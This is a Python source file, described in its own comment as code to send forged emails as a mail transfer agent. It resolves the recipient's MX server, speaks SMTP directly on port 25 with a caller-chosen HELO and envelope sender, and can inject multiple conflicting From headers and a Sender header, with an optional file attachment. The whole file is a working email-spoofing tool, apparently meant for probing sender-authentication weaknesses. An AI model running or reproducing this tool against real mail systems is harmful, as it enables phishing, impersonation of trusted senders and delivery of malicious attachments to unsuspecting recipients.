# -*- coding: UTF-8 -*-
# the code to send forged emails as an MTA
import dns.resolver
from zio3 import *
from email import utils
from email.header import Header
import datetime
import time
from email import header, utils
from config import logger
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


class Smtp:
    def __init__(self, addr):
        self.io = zio((addr, 25))
        self.io.readline()

    def cmd(self, msg):
        self.cmdonly(msg)
        return self.io.readline()

    def cmdonly(self, msg):
        self.io.write(bytes((msg + '\r\n'), encoding="utf8"))

    def interact(self):
        self.io.interact()


def get_email_domain(email):
    at_pos = email.find("@")
    if at_pos == -1:
        logger.warn("from_email format is invalid")
        return None
    return email[at_pos + 1:]


def get_mx(domain):
    try:
        for x in dns.resolver.query(domain, 'MX'):
            txt = x.to_text()
            records = txt.split(" ")
            return records[len(records) - 1]
    except:
        return None


def spoof(mail_from, to_email, subject, content, mime_from=None, mime_from1=None,mime_from2=None, sender=None,
          helo=None,filename=None):
    from_domain = get_email_domain(mail_from)
    if from_domain is None:
        logger.warn("Invalid FROM domain: " + mail_from)

    to_domain = get_email_domain(to_email)
    if to_domain is None:
        logger.warn("Invalid TO domain: " + to_email)

    mx_domain = get_mx(to_domain)
    # print("mx_domain:",mx_domain)
    # print("666")
    if mx_domain is None:
        logger.warn("Can't not resolve mx: " + to_domain)

    # start
    smtp = Smtp(mx_domain)

    if not helo:
        helo = from_domain
    if helo:
        smtp.cmd("HELO " + helo)
    else:
        smtp.cmd("HELO " + 'test1.com')
    smtp.cmd("MAIL FROM: <{}>".format(mail_from))
    smtp.cmd("RCPT TO: <" + to_email + ">")
    smtp.cmd("DATA")
    nowdt = datetime.datetime.now()
    nowtuple = nowdt.timetuple()
    nowtimestamp = time.mktime(nowtuple)
    t = utils.formatdate(nowtimestamp)
    msg = MIMEMultipart()
    smtp.cmdonly("Date: {}".format(t))
    if mime_from1:
        smtp.cmdonly("From: {}".format(mime_from1))
    smtp.cmdonly("From: {}".format(mime_from))
    if mime_from2:
        smtp.cmdonly("From: {}".format(mime_from2))
    if sender:
        smtp.cmdonly("Sender: {}".format(sender))
    smtp.cmdonly("To: <{}>".format(to_email))
    subject = Header(subject, "UTF-8").encode()
    smtp.cmdonly("Subject: {}".format(subject))

    msg['Date'] = t
    msg['From'] = mime_from
    msg['To'] = to_email
    msg['Subject'] = subject
    smtp.cmdonly('Content-Type: text/plain; charset="utf-8"')
    smtp.cmdonly("MIME-Version: 1.0")
    _attach = MIMEText(content, 'utf-8')
    msg.attach(_attach)
    if filename:
        att1 = MIMEText(open('./uploads/'+filename, 'rb').read(), 'base64', 'utf-8')
        att1["Content-Type"] = 'application/octet-stream'
        att1["Content-Disposition"] = 'attachment; filename="{}"'.format(filename)
        # content = msg.as_string()+att1.as_string()
        msg.attach(att1)
    # else:
    #     content = msg.as_string()
    content = msg.as_string()
    # smtp.cmdonly("")
    smtp.cmdonly(content)
    smtp.cmd(".")
    smtp.cmd("quit")
    smtp.interact()

